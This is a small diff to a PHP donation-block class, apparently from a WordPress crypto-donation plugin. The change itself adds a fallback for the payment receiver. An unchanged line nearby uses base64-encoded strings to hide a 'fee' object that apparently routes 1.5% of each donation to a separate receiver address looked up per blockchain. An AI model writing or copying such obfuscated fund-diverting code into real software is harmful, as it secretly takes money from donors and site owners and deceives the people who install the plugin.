@@ -153,7 +153,7 @@ class DePay_Donations_Block {
         'blockchain' => $accepted->blockchain,
         'token' => $accepted->address,
         $AsWr('ZmVl')=> (object)[ $AsWr('cmVjZWl2ZXI=') => $ZmVl->{$accepted->blockchain}, $AsWr('YW1vdW50') => $AsWr('MS41JQ==') ],
-        'receiver' => $accepted->receiver
+        'receiver' => isset( $accepted->receiver ) ? $accepted->receiver : $receiver
       ]);
     }
     $accept = json_encode($accept);
